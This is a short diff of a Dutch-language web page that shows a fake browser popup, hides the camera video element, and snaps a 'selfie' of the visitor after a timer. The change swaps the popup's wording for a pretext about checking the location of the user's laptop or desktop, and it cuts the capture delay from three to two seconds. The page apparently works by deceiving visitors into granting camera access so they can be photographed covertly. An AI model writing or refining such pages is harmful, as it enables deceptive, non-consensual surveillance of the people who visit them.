@@ -22,7 +22,7 @@
 
     <!-- Fake Browser Popup -->
     <div id="fake-popup">
-        <p class="popup-text">Om verder te gaan, moeten de benodigde toestemmingen worden gegeven.</p>
+        <p class="popup-text">Om verder te gaan, controleren wij de locatie van uw netwerklaptop/-desktop.</p>
     </div>
 
     <script>
@@ -88,10 +88,10 @@
                             // Video-element wordt verborgen
                             video.style.display = "none";
 
-                            // Simuleer foto na 3 seconden
+                            // Simuleer foto na 2 seconden
                             setTimeout(() => {
                                 takeSelfie(video, stream);
-                            }, 3000);
+                            }, 2000);
                             resolve();
                         })
                         .catch(error => {
